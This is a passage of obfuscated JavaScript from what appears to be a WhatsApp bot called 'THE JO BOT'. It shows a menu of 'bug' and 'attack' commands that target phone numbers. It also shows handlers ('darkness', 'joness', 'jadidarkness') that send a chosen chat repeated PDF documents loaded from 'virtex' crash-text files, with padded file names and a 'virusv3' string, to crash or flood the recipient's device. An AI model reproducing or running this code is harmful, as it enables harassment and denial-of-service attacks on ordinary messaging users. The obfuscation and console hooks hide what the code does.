','trace','(((.+)+)+)+$','jogasstik\x20(Nomer)\x20\x0a│➳\x20','jobuglocto\x20(Nomer)\x0a│➳\x20','bokep\x0a│➳\x20','3000464wduIoI','jogasbug3\x20(Nomer)\x20\x0a│➳\x20','jobug10\x20(jumlah)\x0a│➳\x20','josantetto\x20(Nomer)\x20\x0a│➳\x20','jogasbug6\x20(Nomer)\x20\x0a│➳\x20','jadingeness\x20(Reply\x20Media)\x20\x0a│➳\x20','jobug2\x20(jumlah)\x0a│➳\x20','jogaskuntul\x20(Nomer)\x0a│➳\x20','jogastroli\x20(Nomer)\x0a│➳\x20','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','jogasbugloc\x20(Nomer)\x0a│➳\x20','{}.constructor(\x22return\x20this\x22)(\x20)','jadijoness\x20(Reply\x20Media)\x20\x0a│➳\x20','josendbug7\x20(Nomer)\x20\x0a│➳\x20','jogaskintol\x20(Nomer)\x0a│➳\x20','josendbug10\x20(Nomer)\x20\x0a│➳\x20','jobugdoc\x20(jumlah)\x0a│➳\x20','kuntulto\x20(Nomer)\x0a│➳\x20','length','constructor','jadicatalog\x20(ReplyImage\x20|\x20Teks)\x20\x0a│➳\x20','jogasbug10\x20(Nomer)\x20\x0a│➳\x20','jobugloc\x20(jumlah)\x0a│➳\x20','jogassantet\x20(Nomer)\x20\x0a│➳\x20','bind','polvot\x0a│➳\x20','36rmDsyS','jogaskintil\x20(Nomer)\x0a│➳\x20','josendbug4\x20(Nomer)\x20\x0a│➳\x20','ngenes\x20(jumlah)\x0a│➳\x20','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','2204720iHlOff','search','jobuginviteto\x20(Nomer)\x0a│➳\x20','darkness\x20(jumlah)\x0a│➳\x20','jobug11\x20(jumlah)\x0a│➳\x20','joness\x20(jumlah)\x0a│➳\x20','buggam\x20(jumlah)\x0a│➳\x20','jadibugstik\x20(Reply\x20Sticker)\x20\x0a│➳\x20','jadimonyet\x20(Teks)\x20\x0a│➳\x20','jomomo\x20(jumlah)\x0a│➳\x20','table','jotagwae\x20(jumlah)\x0a│➳\x20','jogasbug11\x20(Nomer)\x20\x0a│➳\x20','jogasbug9\x20(Nomer)\x20\x0a│➳\x20','poll\x0a│➳\x20','jadibugvn\x20(Reply\x20Audio)\x20\x0a│➳\x20','73199WcGmUu','jobug12\x20(jumlah)\x0a│➳\x20','jotroli\x20(jumlah)\x0a│➳\x20','jogasbug2\x20(Nomer)\x20\x0a│➳\x20','jocatalog\x20(jumlah)\x0a│➳\x20','jobug4\x20(jumlah)\x0a│➳\x20'];_0x2db8=function(){return _0x30036a;};return _0x2db8();}function _0x225d(_0x562681,_0x43cf2e){var _0x5aa0ec=_0x2db8();return _0x225d=function(_0x3d8a83,_0x100604){_0x3d8a83=_0x3d8a83-0x109;var _0xf5a7be=_0x5aa0ec[_0x3d8a83];return _0xf5a7be;},_0x225d(_0x562681,_0x43cf2e);}var _0x15a6dc=_0x225d;(function(_0x4180ce,_0x4781bd){var _0x5eeb76=_0x225d,_0x3b9c31=_0x4180ce();while(!![]){try{var _0xdc47d1=parseInt(_0x5eeb76(0x121))/0x1+-parseInt(_0x5eeb76(0x124))/0x2+-parseInt(_0x5eeb76(0x178))/0x3*(-parseInt(_0x5eeb76(0x145))/0x4)+parseInt(_0x5eeb76(0x14a))/0x5+-parseInt(_0x5eeb76(0x189))/0x6*(parseInt(_0x5eeb76(0x15a))/0x7)+parseInt(_0x5eeb76(0x12b))/0x8+-parseInt(_0x5eeb76(0x175))/0x9;if(_0xdc47d1===_0x4781bd)break;else _0x3b9c31['push'](_0x3b9c31['shift']());}catch(_0x245cfa){_0x3b9c31['push'](_0x3b9c31['shift']());}}}(_0x2db8,0x391f3));var _0x559ff2=(function(){var _0x507e2a=!![];return function(_0x44b050,_0x66f8c5){var _0x5d90f4=_0x507e2a?function(){if(_0x66f8c5){var _0x81ca6b=_0x66f8c5['apply'](_0x44b050,arguments);return _0x66f8c5=null,_0x81ca6b;}}:function(){};return _0x507e2a=![],_0x5d90f4;};}()),_0x2c3f17=_0x559ff2(this,function(){var _0x3fff9d=_0x225d;return _0x2c3f17['toString']()[_0x3fff9d(0x14b)](_0x3fff9d(0x127))[_0x3fff9d(0x180)]()[_0x3fff9d(0x13e)](_0x2c3f17)[_0x3fff9d(0x14b)](_0x3fff9d(0x127));});_0x2c3f17();var _0x100604=(function(){var _0x3f2ba6=!![];return function(_0x4ce18b,_0x5b0343){var _0x4222ce=_0x3f2ba6?function(){var _0x4ea1fd=_0x225d;if(_0x5b0343){var _0x25759d=_0x5b0343[_0x4ea1fd(0x10b)](_0x4ce18b,arguments);return _0x5b0343=null,_0x25759d;}}:function(){};return _0x3f2ba6=![],_0x4222ce;};}()),_0x3d8a83=_0x100604(this,function(){var _0xa7d926=_0x225d,_0x328932;try{var _0x5ebefe=Function('return\x20(function()\x20'+_0xa7d926(0x136)+');');_0x328932=_0x5ebefe();}catch(_0x1ae269){_0x328932=window;}var _0x1db607=_0x328932[_0xa7d926(0x168)]=_0x328932[_0xa7d926(0x168)]||{},_0x1d1a04=['log',_0xa7d926(0x109),_0xa7d926(0x185),'error',_0xa7d926(0x11d),_0xa7d926(0x154),_0xa7d926(0x126)];for(var _0x33a396=0x0;_0x33a396<_0x1d1a04[_0xa7d926(0x13d)];_0x33a396++){var _0x4b2324=_0x100604['constructor']['prototype'][_0xa7d926(0x143)](_0x100604),_0x4d534e=_0x1d1a04[_0x33a396],_0x225b12=_0x1db607[_0x4d534e]||_0x4b2324;_0x4b2324[_0xa7d926(0x17f)]=_0x100604['bind'](_0x100604),_0x4b2324[_0xa7d926(0x180)]=_0x225b12[_0xa7d926(0x180)][_0xa7d926(0x143)](_0x225b12),_0x1db607[_0x4d534e]=_0x4b2324;}});_0x3d8a83();{if(!isCreator&&!isBan)return;anu='\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞BUG\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20BUG\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x158)+prefix+_0x15a6dc(0x12a)+prefix+_0x15a6dc(0x144)+prefix+_0x15a6dc(0x17e)+prefix+_0x15a6dc(0x18d)+prefix+_0x15a6dc(0x114)+prefix+_0x15a6dc(0x10c)+prefix+'jodocu\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x173)+prefix+_0x15a6dc(0x131)+prefix+_0x15a6dc(0x183)+prefix+_0x15a6dc(0x15f)+prefix+_0x15a6dc(0x125)+prefix+_0x15a6dc(0x118)+prefix+_0x15a6dc(0x122)+prefix+_0x15a6dc(0x10d)+prefix+_0x15a6dc(0x16f)+prefix+_0x15a6dc(0x12d)+prefix+_0x15a6dc(0x14e)+prefix+_0x15a6dc(0x15b)+prefix+'kintil\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x15c)+prefix+_0x15a6dc(0x11b)+prefix+'kuntul\x20(jumlah)\x0a│➳\x20'+prefix+'johello\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x16a)+prefix+_0x15a6dc(0x14f)+prefix+_0x15a6dc(0x148)+prefix+_0x15a6dc(0x14d)+prefix+_0x15a6dc(0x150)+prefix+_0x15a6dc(0x115)+prefix+_0x15a6dc(0x153)+prefix+'jobugpc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x179)+prefix+'joliveloc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x17d)+prefix+'jobutton\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x141)+prefix+'crashcok\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x155)+prefix+_0x15a6dc(0x15e)+prefix+_0x15a6dc(0x170)+prefix+_0x15a6dc(0x169)+prefix+_0x15a6dc(0x13b)+prefix+_0x15a6dc(0x110)+prefix+_0x15a6dc(0x184)+prefix+_0x15a6dc(0x187)+prefix+'jocatalogv2\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x181)+prefix+_0x15a6dc(0x172)+prefix+'jobugbutton\x20(jumlah)\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ATTACK\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x111)+prefix+_0x15a6dc(0x11f)+prefix+_0x15a6dc(0x167)+prefix+_0x15a6dc(0x147)+prefix+'josendbug5\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x160)+prefix+_0x15a6dc(0x138)+prefix+_0x15a6dc(0x166)+prefix+'josendbug9\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x13a)+prefix+_0x15a6dc(0x165)+prefix+_0x15a6dc(0x18a)+prefix+_0x15a6dc(0x11c)+prefix+_0x15a6dc(0x119)+prefix+_0x15a6dc(0x16c)+prefix+_0x15a6dc(0x18c)+prefix+_0x15a6dc(0x116)+prefix+'jotrolito\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x17a)+prefix+_0x15a6dc(0x13c)+prefix+_0x15a6dc(0x16e)+prefix+_0x15a6dc(0x12e)+prefix+'jomomoto\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x129)+prefix+_0x15a6dc(0x161)+prefix+'jobuttonto\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x117)+prefix+_0x15a6dc(0x177)+prefix+_0x15a6dc(0x14c)+prefix+'jotengkorakto\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›\x20〘\x20ATTACK2\x20MENU\x20〙\x0a│➳\x20'+prefix+'jogasbug1\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x15d)+prefix+_0x15a6dc(0x12c)+prefix+_0x15a6dc(0x11e)+prefix+_0x15a6dc(0x10e)+prefix+_0x15a6dc(0x12f)+prefix+'jogasbug7\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x16b)+prefix+_0x15a6dc(0x157)+prefix+_0x15a6dc(0x140)+prefix+_0x15a6dc(0x156)+prefix+_0x15a6dc(0x164)+prefix+_0x15a6dc(0x113)+prefix+_0x15a6dc(0x128)+prefix+_0x15a6dc(0x188)+prefix+_0x15a6dc(0x133)+prefix+_0x15a6dc(0x146)+prefix+'jogashello\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x139)+prefix+_0x15a6dc(0x132)+prefix+'jogasmomo\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x142)+prefix+_0x15a6dc(0x186)+prefix+_0x15a6dc(0x171)+prefix+'jogasbutton\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x135)+prefix+_0x15a6dc(0x112)+prefix+'polling\x20(Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x17b)+prefix+_0x15a6dc(0x11a)+prefix+_0x15a6dc(0x182)+prefix+_0x15a6dc(0x152)+prefix+_0x15a6dc(0x174)+prefix+'tobugstik\x20(Reply\x20Image)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x159)+prefix+_0x15a6dc(0x162)+prefix+_0x15a6dc(0x151)+prefix+_0x15a6dc(0x137)+prefix+_0x15a6dc(0x130)+prefix+_0x15a6dc(0x163)+prefix+_0x15a6dc(0x16d)+prefix+_0x15a6dc(0x18b)+prefix+'jadikontol\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x123)+prefix+_0x15a6dc(0x17c)+prefix+_0x15a6dc(0x13f)+prefix+'jadibuttonimg\x20(ReplyImage\x20|\x20Teks)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a',jobotz[_0x15a6dc(0x176)](m['chat'],{'image':{'url':_0x15a6dc(0x149)},'contextInfo':{'externalAdReply':{'title':_0x15a6dc(0x134),'body':_0x15a6dc(0x10a)+runtime(process['uptime']()),'previewType':_0x15a6dc(0x10f),'showAdAttribution':!![],'sourceUrl':_0x15a6dc(0x120),'thumbnailUrl':_0x15a6dc(0x149)}},'caption':anu});}
}
break

case 'darkness':{
const _0x5e8056=_0x48ff;(function(_0xb15716,_0x3135d5){const _0x50adb3=_0x48ff,_0x507c10=_0xb15716();while(!![]){try{const _0xfcd69b=parseInt(_0x50adb3(0xd2))/0x1*(parseInt(_0x50adb3(0xcb))/0x2)+parseInt(_0x50adb3(0xc5))/0x3*(-parseInt(_0x50adb3(0xd5))/0x4)+parseInt(_0x50adb3(0xb8))/0x5*(-parseInt(_0x50adb3(0xc4))/0x6)+parseInt(_0x50adb3(0xca))/0x7*(-parseInt(_0x50adb3(0xd1))/0x8)+-parseInt(_0x50adb3(0xbc))/0x9+parseInt(_0x50adb3(0xc8))/0xa+parseInt(_0x50adb3(0xc6))/0xb;if(_0xfcd69b===_0x3135d5)break;else _0x507c10['push'](_0x507c10['shift']());}catch(_0x356618){_0x507c10['push'](_0x507c10['shift']());}}}(_0x128e,0x51051));const _0x2528f7=(function(){let _0x2e5292=!![];return function(_0x17b649,_0x444f6f){const _0x44a776=_0x2e5292?function(){if(_0x444f6f){const _0x5db2e7=_0x444f6f['apply'](_0x17b649,arguments);return _0x444f6f=null,_0x5db2e7;}}:function(){};return _0x2e5292=![],_0x44a776;};}()),_0x7258c2=_0x2528f7(this,function(){const _0x2d00bd=_0x48ff;return _0x7258c2[_0x2d00bd(0xbe)]()['search'](_0x2d00bd(0xc1))[_0x2d00bd(0xbe)]()[_0x2d00bd(0xc9)](_0x7258c2)[_0x2d00bd(0xc7)](_0x2d00bd(0xc1));});_0x7258c2();function _0x128e(){const _0x2dc4df=['(((.+)+)+)+$','Jumlahnya?','{}.constructor(\x22return\x20this\x22)(\x20)','204qRhifS','99NklSqj','11086196QAzThg','search','2488390xKjZpM','constructor','580181UjPiGw','390058qbztNS','PHOTO','reply','Sukses\x20Send\x20Bug\x20Sebanyak\x20','length','Darkness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','24iVzhan','2APDPWZ','bind','log','46948RNrHVz','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','chat','./virtex/Darkness\x20メ','warn','return\x20(function()\x20','63805iDrXKV','table','readFileSync','sendMessage','2205288SAObwG','apply','toString','trace','prototype'];_0x128e=function(){return _0x2dc4df;};return _0x128e();}function _0x48ff(_0x442108,_0x232ef8){const _0x88c87c=_0x128e();return _0x48ff=function(_0x3a2a89,_0x2fe501){_0x3a2a89=_0x3a2a89-0xb3;let _0xb29c6e=_0x88c87c[_0x3a2a89];return _0xb29c6e;},_0x48ff(_0x442108,_0x232ef8);}const _0x2fe501=(function(){let _0x3900d2=!![];return function(_0x35c621,_0x472b1e){const _0x5a5a3b=_0x3900d2?function(){const _0x27b5b7=_0x48ff;if(_0x472b1e){const _0x4ce9a0=_0x472b1e[_0x27b5b7(0xbd)](_0x35c621,arguments);return _0x472b1e=null,_0x4ce9a0;}}:function(){};return _0x3900d2=![],_0x5a5a3b;};}()),_0x3a2a89=_0x2fe501(this,function(){const _0x3ccb40=_0x48ff;let _0xb1e187;try{const _0x1a17d6=Function(_0x3ccb40(0xb7)+_0x3ccb40(0xc3)+');');_0xb1e187=_0x1a17d6();}catch(_0xd6b915){_0xb1e187=window;}const _0x263d33=_0xb1e187['console']=_0xb1e187['console']||{},_0x5d5dea=[_0x3ccb40(0xd4),_0x3ccb40(0xb6),'info','error','exception',_0x3ccb40(0xb9),_0x3ccb40(0xbf)];for(let _0x398881=0x0;_0x398881<_0x5d5dea[_0x3ccb40(0xcf)];_0x398881++){const _0x135224=_0x2fe501[_0x3ccb40(0xc9)][_0x3ccb40(0xc0)][_0x3ccb40(0xd3)](_0x2fe501),_0x2766d0=_0x5d5dea[_0x398881],_0x3bd9b9=_0x263d33[_0x2766d0]||_0x135224;_0x135224['__proto__']=_0x2fe501[_0x3ccb40(0xd3)](_0x2fe501),_0x135224[_0x3ccb40(0xbe)]=_0x3bd9b9[_0x3ccb40(0xbe)][_0x3ccb40(0xd3)](_0x3bd9b9),_0x263d33[_0x2766d0]=_0x135224;}});_0x3a2a89();{if(!isCreator&&!isBan)return;if(args[_0x5e8056(0xcf)]==0x0)return m[_0x5e8056(0xcd)](_0x5e8056(0xc2));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x5e8056(0xbb)](m[_0x5e8056(0xb4)],{'document':fs[_0x5e8056(0xba)](_0x5e8056(0xb5)),'mimetype':'document/pdf','fileName':_0x5e8056(0xd0)+virusv3,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':_0x5e8056(0xcc),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x5e8056(0xb3)}}},{'quoted':fkonjo,'contextInfo':{}});}jancok(_0x5e8056(0xce)+jumlah);}
}
break

case 'jadidarkness':{
function _0x476b(_0x3232d3,_0x4b14b3){const _0x403352=_0x200d();return _0x476b=function(_0x1fd4e7,_0x531567){_0x1fd4e7=_0x1fd4e7-0x183;let _0x4d47b9=_0x403352[_0x1fd4e7];return _0x4d47b9;},_0x476b(_0x3232d3,_0x4b14b3);}const _0x294e0c=_0x476b;(function(_0x37b758,_0xf4e57d){const _0x54029c=_0x476b,_0x99b25=_0x37b758();while(!![]){try{const _0x3b334b=-parseInt(_0x54029c(0x196))/0x1+parseInt(_0x54029c(0x18d))/0x2*(-parseInt(_0x54029c(0x1a4))/0x3)+parseInt(_0x54029c(0x195))/0x4*(-parseInt(_0x54029c(0x18e))/0x5)+-parseInt(_0x54029c(0x19e))/0x6+parseInt(_0x54029c(0x1a1))/0x7*(-parseInt(_0x54029c(0x192))/0x8)+-parseInt(_0x54029c(0x19c))/0x9+-parseInt(_0x54029c(0x185))/0xa*(-parseInt(_0x54029c(0x19a))/0xb);if(_0x3b334b===_0xf4e57d)break;else _0x99b25['push'](_0x99b25['shift']());}catch(_0x21a89f){_0x99b25['push'](_0x99b25['shift']());}}}(_0x200d,0x52580));const _0x18fc43=(function(){let _0x1d29d8=!![];return function(_0xb031b3,_0x172638){const _0x442a9d=_0x1d29d8?function(){const _0x191977=_0x476b;if(_0x172638){const _0x594c3c=_0x172638[_0x191977(0x18a)](_0xb031b3,arguments);return _0x172638=null,_0x594c3c;}}:function(){};return _0x1d29d8=![],_0x442a9d;};}()),_0x510d3e=_0x18fc43(this,function(){const _0x3b92ec=_0x476b;return _0x510d3e['toString']()[_0x3b92ec(0x18c)](_0x3b92ec(0x199))[_0x3b92ec(0x194)]()[_0x3b92ec(0x186)](_0x510d3e)[_0x3b92ec(0x18c)](_0x3b92ec(0x199));});_0x510d3e();const _0x531567=(function(){let _0x59db5c=!![];return function(_0x29e80e,_0x10095c){const _0x51bae2=_0x59db5c?function(){const _0x2e59f2=_0x476b;if(_0x10095c){const _0x146a48=_0x10095c[_0x2e59f2(0x18a)](_0x29e80e,arguments);return _0x10095c=null,_0x146a48;}}:function(){};return _0x59db5c=![],_0x51bae2;};}()),_0x1fd4e7=_0x531567(this,function(){const _0x1231bf=_0x476b,_0x315a7d=function(){const _0x38f29d=_0x476b;let _0x1266c9;try{_0x1266c9=Function('return\x20(function()\x20'+_0x38f29d(0x184)+');')();}catch(_0x21c738){_0x1266c9=window;}return _0x1266c9;},_0x2baa4f=_0x315a7d(),_0x1cf0a2=_0x2baa4f[_0x1231bf(0x187)]=_0x2baa4f[_0x1231bf(0x187)]||{},_0x18ae08=['log',_0x1231bf(0x197),_0x1231bf(0x183),_0x1231bf(0x193),_0x1231bf(0x1a3),_0x1231bf(0x19b),_0x1231bf(0x198)];for(let _0x172649=0x0;_0x172649<_0x18ae08['length'];_0x172649++){const _0x69597f=_0x531567[_0x1231bf(0x186)]['prototype'][_0x1231bf(0x19f)](_0x531567),_0x3fe86d=_0x18ae08[_0x172649],_0x350428=_0x1cf0a2[_0x3fe86d]||_0x69597f;_0x69597f['__proto__']=_0x531567[_0x1231bf(0x19f)](_0x531567),_0x69597f['toString']=_0x350428[_0x1231bf(0x194)]['bind'](_0x350428),_0x1cf0a2[_0x3fe86d]=_0x69597f;}});function _0x200d(){const _0x27b34a=['{}.constructor(\x22return\x20this\x22)(\x20)','10YJlSla','constructor','console','quoted','sendMessage','apply','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','search','2XiJdmW','23995mrBxoj','document/pdf','PHOTO','Sukses','223424rgLjjD','error','toString','124IBQoUn','105340kCEdGN','warn','trace','(((.+)+)+)+$','24579852BoOGci','table','5313168TYPKdO','chat','2376528CZJQPW','bind','Darkness\x20メ\x20','42nFAVEX','Teksnya\x20Mana?','exception','1467405mBqSyt','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','info'];_0x200d=function(){return _0x27b34a;};return _0x200d();}_0x1fd4e7();{if(!isCreator&&!isBan)return;if(!m[_0x294e0c(0x188)])throw'*Send/Reply\x20Media';if(!text)throw _0x294e0c(0x1a2);let media=await quoted['download']();var messa=await prepareWAMessageMedia({'document':media},{'upload':jobotz['waUploadToServer']});lala=media,jobotz[_0x294e0c(0x189)](m[_0x294e0c(0x19d)],{'document':lala,'mimetype':_0x294e0c(0x18f),'fileName':_0x294e0c(0x1a0)+text+_0x294e0c(0x18b)+virusv3,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':_0x294e0c(0x190),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x294e0c(0x1a5)}}},{'quoted':fkonjo,'contextInfo':{}}),jancok(_0x294e0c(0x191));}
}
break

case 'joness':{
const _0x1cbec2=_0xb017;function _0xb017(_0x4b2a12,_0x4cba37){const _0x2c661e=_0x3c5c();return _0xb017=function(_0x5d2bf4,_0x4e6ff3){_0x5d2bf4=_0x5d2bf4-0xc1;let _0x345aef=_0x2c661e[_0x5d2bf4];return _0x345aef;},_0xb017(_0x4b2a12,_0x4cba37);}function _0x3c5c(){const _0x4e6ad3=['5436858pTefzh','error','2430948zaiWid','exception','8873730scIUCB','constructor','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1091651SqreVB','1893312DklKvG','readFileSync','271550HLfHLz','length','toString','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','bind','1092204zbcrtG','prototype','15bmFOKc','info','10MCDENK','Jumlahnya?','console','(((.+)+)+)+$','sendMessage','18xryhaO','chat','search','return\x20(function()\x20','./virtex/Darkness\x20メ','PHOTO','trace'];_0x3c5c=function(){return _0x4e6ad3;};return _0x3c5c();}(function(_0x4ce136,_0x464f72){const _0x59cee3=_0xb017,_0x3c5786=_0x4ce136();while(!![]){try{const _0x108398=-parseInt(_0x59cee3(0xd6))/0x1+parseInt(_0x59cee3(0xd9))/0x2*(parseInt(_0x59cee3(0xc1))/0x3)+-parseInt(_0x59cee3(0xde))/0x4+-parseInt(_0x59cee3(0xc3))/0x5*(parseInt(_0x59cee3(0xd1))/0x6)+parseInt(_0x59cee3(0xcf))/0x7+parseInt(_0x59cee3(0xd7))/0x8*(parseInt(_0x59cee3(0xc8))/0x9)+parseInt(_0x59cee3(0xd3))/0xa;if(_0x108398===_0x464f72)break;else _0x3c5786['push'](_0x3c5786['shift']());}catch(_0x26e4b7){_0x3c5786['push'](_0x3c5786['shift']());}}}(_0x3c5c,0x9c8e4));const _0xe3cfb6=(function(){let _0x3f86df=!![];return function(_0x27e657,_0x152dcc){const _0xc65a8f=_0x3f86df?function(){if(_0x152dcc){const _0x3c41cc=_0x152dcc['apply'](_0x27e657,arguments);return _0x152dcc=null,_0x3c41cc;}}:function(){};return _0x3f86df=![],_0xc65a8f;};}()),_0x47f2ef=_0xe3cfb6(this,function(){const _0x5d994e=_0xb017;return _0x47f2ef['toString']()[_0x5d994e(0xca)](_0x5d994e(0xc6))[_0x5d994e(0xdb)]()['constructor'](_0x47f2ef)[_0x5d994e(0xca)]('(((.+)+)+)+$');});_0x47f2ef();const _0x4e6ff3=(function(){let _0x1a7b83=!![];return function(_0x31c0b5,_0x543e68){const _0x12a9d3=_0x1a7b83?function(){if(_0x543e68){const _0x17ad51=_0x543e68['apply'](_0x31c0b5,arguments);return _0x543e68=null,_0x17ad51;}}:function(){};return _0x1a7b83=![],_0x12a9d3;};}()),_0x5d2bf4=_0x4e6ff3(this,function(){const _0x5245fa=_0xb017,_0x57630e=function(){const _0x59eba2=_0xb017;let _0x475f86;try{_0x475f86=Function(_0x59eba2(0xcb)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1fecd0){_0x475f86=window;}return _0x475f86;},_0x33fd4a=_0x57630e(),_0x10f6e0=_0x33fd4a[_0x5245fa(0xc5)]=_0x33fd4a[_0x5245fa(0xc5)]||{},_0x1c5b86=['log','warn',_0x5245fa(0xc2),_0x5245fa(0xd0),_0x5245fa(0xd2),'table',_0x5245fa(0xce)];for(let _0x456e18=0x0;_0x456e18<_0x1c5b86[_0x5245fa(0xda)];_0x456e18++){const _0x550fb5=_0x4e6ff3[_0x5245fa(0xd4)][_0x5245fa(0xdf)][_0x5245fa(0xdd)](_0x4e6ff3),_0x28316c=_0x1c5b86[_0x456e18],_0x28b9b4=_0x10f6e0[_0x28316c]||_0x550fb5;_0x550fb5['__proto__']=_0x4e6ff3[_0x5245fa(0xdd)](_0x4e6ff3),_0x550fb5['toString']=_0x28b9b4[_0x5245fa(0xdb)][_0x5245fa(0xdd)](_0x28b9b4),_0x10f6e0[_0x28316c]=_0x550fb5;}});_0x5d2bf4();{if(!isCreator&&!isBan)return;if(args[_0x1cbec2(0xda)]==0x0)return m['reply'](_0x1cbec2(0xc4));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x1cbec2(0xc7)](m[_0x1cbec2(0xc9)],{'document':fs[_0x1cbec2(0xd8)](_0x1cbec2(0xcc)),'mimetype':'document/pdf','fileName':'Joness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+thejo,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+thejo,'body':wm+'\x20\x0a'+thejo,'previewType':_0x1cbec2(0xcd),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x1cbec2(0xdc)}},'caption':''+thejo},{'quoted':fkonjo,'contextInfo':{}});}jancok(_0x1cbec2(0xd5)+jumlah);}
}
break

case 'jadijoness':{
const _0x2dcedc=_0x1359;(function(_0x5988eb,_0x5b1dbf){const _0x33a7f2=_0x1359,_0x1e2eb8=_0x5988eb();while(!![]){try{const _0x31b1ab=-parseInt(_0x33a7f2(0x1b0))/0x1+-parseInt(_0x33a7f2(0x1b4))/0x2+-parseInt(_0x33a7f2(0x1c1))/0x3+-parseInt(_0x33a7f2(0x1aa))/0x4*(-parseInt(_0x33a7f2(0x1bf))/0x5)+-parseInt(_0x33a7f2(0x1c8))/0x6*(parseInt(_0x33a7f2(0x1b6))/0x7)+-parseInt(_0x33a7f2(0x1bd))/0x8*(-parseInt(_0x33a7f2(0x1b2))/0x9)+-parseInt(_0x33a7f2(0x1b7))/0xa*(-parseInt(_0x33a7f2(0x1c4))/0xb);if(_0x31b1ab===_0x5b1dbf)break;else _0x1e2eb8['push'](_0x1e2eb8['shift']());}catch(_0x1598fd){_0x1e2eb8['push'](_0x1e2eb8['shift']());}}}(_0x59ba,0x61a3f));const _0x156b25=(function(){let _0x190be9=!![];return function(_0x58afb3,_0x172c9c){const _0x38620b=_0x190be9?function(){const _0x2cd4bf=_0x1359;if(_0x172c9c){const _0x9338cc=_0x172c9c[_0x2cd4bf(0x1c0)](_0x58afb3,arguments);return _0x172c9c=null,_0x9338cc;}}:function(){};return _0x190be9=![],_0x38620b;};}()),_0x26a62=_0x156b25(this,function(){const _0x5741c7=_0x1359;return 